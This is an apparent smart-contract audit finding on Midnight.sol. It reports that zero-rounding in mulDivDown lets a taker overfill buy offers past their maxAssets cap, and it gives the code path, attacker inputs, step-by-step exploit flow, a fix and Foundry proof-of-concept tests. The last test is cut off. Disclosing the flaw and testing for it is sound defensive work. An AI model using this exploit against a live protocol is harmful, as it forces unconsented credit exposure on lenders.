### Title
Buy-offer `maxAssets` cap bypassed via `mulDivDown` zero-rounding when `buyerPrice < WAD` - (`src/Midnight.sol`)

### Summary
When `offer.buy = true` and `buyerPrice < WAD`, calling `take()` with a small `units` value causes `mulDivDown(units, buyerPrice, WAD)` to return `0`. Because `consumed` is incremented by `buyerAssets` (which is `0`), the `ConsumedAssets` guard never triggers even when the offer is already fully consumed, allowing a taker to overfill the offer indefinitely and push the maker's credit position beyond the `maxAssets` cap. This is explicitly documented as a known bug in the test suite under `testBugBuyMaxAssetsBypass`.

### Finding Description

**Exact code path — `src/Midnight.sol:363-369`:**

```solidity
uint256 buyerAssets = offer.buy
    ? units.mulDivDown(buyerPrice, WAD)   // rounds DOWN → can be 0
    : units.mulDivUp(buyerPrice, WAD);

if (offer.maxAssets > 0) {
    newConsumed = consumed[offer.maker][offer.group] += offer.buy ? buyerAssets : sellerAssets;
    require(newConsumed <= offer.maxAssets, ConsumedAssets());   // guard
}
```

`mulDivDown` is `(x * y) / d` (integer division, no rounding-up). [1](#0-0) 

When `offer.buy = true` and `offerPrice < WAD` (any tick below `MAX_TICK`), `buyerPrice < WAD`. For any `units` satisfying `units * buyerPrice < WAD`, the expression evaluates to `0`. [2](#0-1) 

**Attacker-controlled inputs:**
- `offer.buy = true`, `offer.maxAssets > 0`
- `offer.tick` chosen so that `buyerPrice < WAD` (e.g., `MAX_TICK - 16`)
- `units = 1` (satisfies `1 * buyerPrice < WAD` whenever `buyerPrice < WAD`)

**Exploit flow:**
1. Maker (lender) creates a buy offer with `maxAssets = X` and `tick` such that `buyerPrice < WAD`.
2. Offer is fully consumed: `consumed[maker][group] == maxAssets`.
3. Taker calls `take(offer, ..., units=1, ...)`.
4. `buyerAssets = mulDivDown(1, buyerPrice, WAD) = 0`.
5. `newConsumed = maxAssets + 0 = maxAssets ≤ maxAssets` → guard passes.
6. Position state mutates: maker's credit increases, taker's debt increases, `totalUnits` increases.
7. Step 3–6 can be repeated unboundedly.

**Why existing checks fail:**
The `ConsumedAssets` guard at line 369 only fires when `newConsumed > maxAssets`. Because `buyerAssets = 0`, `newConsumed` never exceeds `maxAssets`, so the guard is permanently bypassed regardless of how many times the offer is taken. [3](#0-2) 

The codebase's own test suite confirms this with `testBugBuyMaxAssetsBypass`, which pre-consumes the offer to `maxAssets`, then calls `take(1, ...)` and asserts that `buyerAssets == 0`, `consumed` is unchanged, yet `creditOf(lender)`, `debtOf(borrower)`, and `totalUnits` all strictly increase. [4](#0-3) 

### Impact Explanation
The `maxAssets` cap — the maker's stated hard limit on capital deployment — is rendered ineffective. An unprivileged taker can force the maker's credit position to grow without bound beyond `maxAssets`, violating the core invariant that "offers cannot be overfilled." The maker accumulates unbounded credit exposure they never consented to, and the consumed accounting permanently diverges from the actual units filled.

### Likelihood Explanation
**Preconditions:**
- `offer.buy = true` (lender is maker/buyer)
- `offer.maxAssets > 0`
- `buyerPrice < WAD`, i.e., `offerPrice < WAD` — satisfied by any tick below `MAX_TICK`

These are all normal, reachable market conditions. The tick constraint is not restrictive: `TickLib.tickToPrice` returns values ≤ WAD for all valid ticks, and the protocol explicitly documents that `buyerPrice ≤ WAD` is the common case. [5](#0-4) 

The attack is **repeatable with zero cost** to the taker: `buyerAssets = 0` means no tokens are transferred per iteration. Any taker can execute it in a loop within a single transaction.

### Recommendation
Add a guard that rejects a `take` call when `offer.maxAssets > 0`, `offer.buy = true`, and `buyerAssets == 0` but `units > 0`. Concretely, after computing `buyerAssets`, require:

```solidity
require(units == 0 || buyerAssets > 0, ZeroBuyerAssets());
```

Alternatively, track consumed in **units** (not assets) when `buyerPrice < WAD` makes asset-based tracking lossy, or require `buyerPrice >= some_minimum` to ensure the rounding gap is bounded.

### Proof of Concept

**Foundry unit test (mirrors `testBugBuyMaxAssetsBypass`):**

```solidity
function testMaxAssetsBypassFuzz(uint256 units, uint256 tick) public {
    // Precondition: buyerPrice < WAD
    tick = bound(tick, 0, MAX_TICK - 1);
    uint256 buyerPrice = TickLib.tickToPrice(tick); // < WAD
    // Choose units small enough that mulDivDown rounds to 0
    units = bound(units, 1, (WAD - 1) / buyerPrice); // units * buyerPrice < WAD

    lenderOffer.maxUnits = 0;
    lenderOffer.maxAssets = 1;
    lenderOffer.tick = tick;

    // Pre-consume to cap
    vm.prank(lender);
    midnight.setConsumed(lenderOffer.group, 1, lender);

    collateralize(market, borrower, units);
    uint256 creditBefore = midnight.creditOf(id, lender);

    take(units, borrower, lenderOffer); // must NOT succeed

    // Assertion: credit must not have increased beyond cap
    assertEq(midnight.creditOf(id, lender), creditBefore,
        "offer overfilled: credit grew past maxAssets cap");
    assertEq(midnight.consumed(lender, lenderOffer.group), 1,
        "consumed must equal maxAssets");
}
```

**Expected (buggy) outcome:** `creditOf(lender) > creditBefore` and `consumed == maxAssets` — the assertion fails, confirming the overfill. [6](#0-5)

    function testBugBuyMaxAssetsBypass() public {

        collateralize(market, borrower, 100);

        lenderOffer.maxUnits = 0;
        lenderOffer.maxAssets = 1;
        lenderOffer.tick = MAX_TICK - 16; // offerPrice < WAD

        // Fully consume the offer before the take.
        vm.prank(lender);
        midnight.setConsumed(lenderOffer.group, lenderOffer.maxAssets, lender);

        uint256 lenderCreditBefore = midnight.creditOf(id, lender);
        uint256 borrowerDebtBefore = midnight.debtOf(id, borrower);
        uint256 totalUnitsBefore = midnight.totalUnits(id);
        uint256 lenderBalBefore = loanToken.balanceOf(lender);
        uint256 borrowerBalBefore = loanToken.balanceOf(borrower);

        (uint256 buyerAssets, uint256 sellerAssets) = take(1, borrower, lenderOffer);

        assertEq(buyerAssets, 0);
        assertEq(sellerAssets, 0);

        // Nothing observable to the cap or token balances changed:

        // But position state strictly changed:
        assertGt(midnight.creditOf(id, lender), lenderCreditBefore);
        assertGt(midnight.debtOf(id, borrower), borrowerDebtBefore);
